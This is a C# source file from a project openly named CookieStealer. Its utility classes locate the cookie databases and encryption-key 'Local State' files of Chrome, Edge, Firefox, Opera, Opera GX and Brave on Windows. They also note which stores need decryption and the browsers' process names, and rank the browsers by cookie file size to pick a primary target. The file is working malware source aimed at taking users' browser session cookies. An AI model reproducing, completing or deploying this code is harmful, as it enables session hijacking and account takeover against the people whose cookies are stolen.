namespace CookieStealer.Utilities
{
    public class BrowserInfo
    {
        public string? PathToLocalState { get; set; }
        public string? PathToCookiesFile { get; set; }
        public string? ProcessName { get; set; }
        public bool NeedDecryption { get; set; }
        public bool Exists { get; set; }
        public bool IsPrimary { get; set; }
    }

    public class BrowserData
    {
        public Dictionary<string, BrowserInfo> Browsers { get; set; }

        public BrowserData()
        {
            var localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            const string chromiumDefaultLocalState = @"User Data\Local State";
            const string chromiumDefaultCookies = @"User Data\Default\Network\Cookies";
            
            Browsers = new Dictionary<string, BrowserInfo>
            {
                {
                    "Chrome", new BrowserInfo
                    {
                        PathToLocalState = @$"{localAppDataPath}\Google\Chrome\{chromiumDefaultLocalState}",
                        PathToCookiesFile = @$"{localAppDataPath}\Google\Chrome\{chromiumDefaultCookies}",
                        ProcessName = "chrome",
                        NeedDecryption = true
                    }
                },
                {
                    "MsEdge", new BrowserInfo
                    {
                        PathToLocalState = @$"{localAppDataPath}\Microsoft\Edge\{chromiumDefaultLocalState}",
                        PathToCookiesFile = @$"{localAppDataPath}\Microsoft\Edge\{chromiumDefaultCookies}",
                        ProcessName = "msedge",
                        NeedDecryption = true
                    }
                },
                {
                    "Firefox", new BrowserInfo
                    {
                        PathToLocalState = null,
                        PathToCookiesFile = null,
                        ProcessName = "firefox",
                        NeedDecryption = false
                    }
                },
                {
                    "Opera", new BrowserInfo
                    {
                        PathToLocalState = @$"{appDataPath}\Opera Software\Opera Stable\Local State",
                        PathToCookiesFile = @$"{appDataPath}\Opera Software\Opera Stable\Default\Network\Cookies",
                        ProcessName = "opera",
                        NeedDecryption = true
                    }
                },
                {
                    "OperaGX", new BrowserInfo
                    {
                        PathToLocalState = @$"{appDataPath}\Opera Software\Opera GX Stable\Local State",
                        PathToCookiesFile = @$"{appDataPath}\Opera Software\Opera GX Stable\Network\Cookies",
                        ProcessName = "opera",
                        NeedDecryption = true
                    }
                },
                {
                    "Brave", new BrowserInfo
                    {
                        PathToLocalState = @$"{localAppDataPath}\BraveSoftware\Brave-Browser\{chromiumDefaultLocalState}",
                        PathToCookiesFile = @$"{localAppDataPath}\BraveSoftware\Brave-Browser\{chromiumDefaultCookies}",
                        ProcessName = "brave",
                        NeedDecryption = true
                    }
                }
            };

            var firefoxProfilePath = Directory.GetDirectories(@$"{appDataPath}\Mozilla\Firefox\Profiles")
                .FirstOrDefault(dir => dir.EndsWith("-release"));

            if (firefoxProfilePath != null)
            {
                Browsers["Firefox"].PathToCookiesFile = Path.Combine(firefoxProfilePath, "cookies.sqlite");
            }
            else
            {
                Browsers["Firefox"].Exists = false;
            }

            foreach (var browser in Browsers
                         .Where(browser => Path.Exists(browser.Value.PathToCookiesFile)))
            {
                browser.Value.Exists = true;
            }

            var sortedBrowsers = Browsers.OrderByDescending(b =>
            {
                var fileInfo = new FileInfo(b.Value.PathToCookiesFile);
                return fileInfo.Exists ? fileInfo.Length : 0;
            }).ToDictionary(b => b.Key, b => b.Value);

            Browsers = sortedBrowsers;
            Browsers[Browsers.Keys.First()].IsPrimary = true;

        }
    }
}